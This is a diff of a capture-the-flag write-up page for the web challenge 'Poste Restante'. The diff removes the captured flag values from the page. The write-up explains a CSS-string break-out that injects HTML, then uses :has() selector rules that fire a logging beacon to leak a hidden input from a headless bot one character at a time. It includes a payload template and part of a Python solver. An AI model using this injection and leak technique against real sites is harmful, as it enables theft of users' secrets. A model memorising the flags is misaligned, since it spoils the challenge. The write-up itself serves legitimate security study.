@@ -74,7 +74,7 @@
         <p class="masthead-meta">
           <span>Challenge 12 of 15</span>
           <span>Web</span>
-          <span class="live">Solved · 100 pts</span>
+          <span class="live">Full writeup</span>
         </p>
       </div>
       <div class="hero-deck">
@@ -84,7 +84,6 @@
           <p class="deck">Poste Restante is an anonymous dead-drop board: leave a message, dress up the envelope with a little custom CSS, and every drop keeps its own private pickup log. Leave a message, never meet the courier.</p>
           <p class="wu-meta">
             <span class="cat cat-web">Web</span><span class="sep">·</span>
-            <span>100 points</span><span class="sep">·</span>
             <span>4 November 2026</span>
           </p>
         </div>
@@ -97,7 +96,7 @@
       <div class="wu-layout">
         <article class="wu" data-reveal>
           <div class="tldr"><p class="lab">TL;DR</p><p>The per-drop "envelope cipher" CSS field is validated by a real CSS parser with a property/ value allowlist, but the accepted CSS is echoed verbatim into a &lt;style&gt; block, and a CSS string literal may contain &lt;/style&gt;, giving arbitrary HTML injection (including a second &lt;style&gt; that never sees the validator). Under a JS-free CSP (default-src 'none'; style-src 'unsafe-inline'; img- src 'self'), the same-origin pickup beacon /px/:id logs the full request URL including query string into an owner-readable log, so html:has(input[value^='…']) #qN{background:url(/px/ COLLECTOR?p=N)} rules turn the headless-Chrome courier bot into a CSS-selector oracle that leaks the courier-only hidden &lt;input value="BHFlagY{…}"&gt; one character at a time.</p></div>
-          <div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{ea9380bc79fd02eefb1fbb538337a432}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><div class="flagbox"><span class="lab">Captured</span><span class="flagval">BHFlagY{f4e3c8951a06dad601af1687cf8fd74d}</span><button class="reveal-btn" type="button" aria-label="Reveal flag">Reveal</button></div><p class="flag-note">Instances are provisioned per run, so these are the values our instances returned.</p>
+          <div class="flagbox"><span class="lab">Captured</span></div>
           <section id="recon"><h2><span class="hn">01</span>Recon</h2><p>App surface (Express-style Node app, session cookie sid=&lt;32 hex&gt;, HttpOnly; SameSite=Lax):</p>
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">http</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>ENDPOINT             BEHAVIOUR
 
@@ -162,7 +161,7 @@ a{font-family:"IMPORT"}      a{font-family:"a@b"}      a{font-family:"&lt;/style
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">snippet</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>html:has(body&gt;input:nth-child(4)[value^='&lt;prefix&gt;&lt;char&gt;']) #qN{background-image:url(/px/C?p=cN)}</code></pre></figure>
 <p>Start with the full printable charset for the first characters; once the format is clear, switch to the 17-char set 0123456789abcdef} (} doubles as the terminator). Retry a round up to 3× when the control beacon zctl does not fire (courier never rendered).</p>
 <ol class="steps" start="8"><li>Verify with an exact-match pair in one round: body&gt;input:nth-child(4)[value='FLAG'] fires and [value='FLAGX'] does not.</li></ol>
-<p>Result on the first instance: BHFlagY{ea9380bc79fd02eefb1fbb538337a432} (41 chars, ~5 s/char once the payload was small). Re-running the packaged script unattended against a fresh instance produced BHFlagY{f4e3c8951a06dad601af1687cf8fd74d} with verified: True, the flag is generated per instance.</p>
+<p>Result on the first instance: BHFlagY{...} (41 chars, ~5 s/char once the payload was small). Re-running the packaged script unattended against a fresh instance produced BHFlagY{...} with verified: True, the flag is generated per instance.</p>
 <p>Solver: <code>/home/kali/Desktop/CTF/Crpto/Hokan/solution/solve_dead_drop.py</code> (python3 <code>solve_dead_drop.py</code> http://&lt;instance-host&gt;).</p>
 <p>Key code @staticmethod def wrap(payload): """Hide an HTML payload inside a CSS string so the validator only ever sees a{font-family:"&lt;string&gt;"}.""" assert '"' not in payload, "payload may not contain a double quote"</p>
 <figure class="code"><div class="code-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span class="code-lang">python</span><button class="code-copy" type="button" aria-label="Copy snippet">Copy</button></div><pre><code>         assert "\\" not in payload, "payload may not contain a backslash"
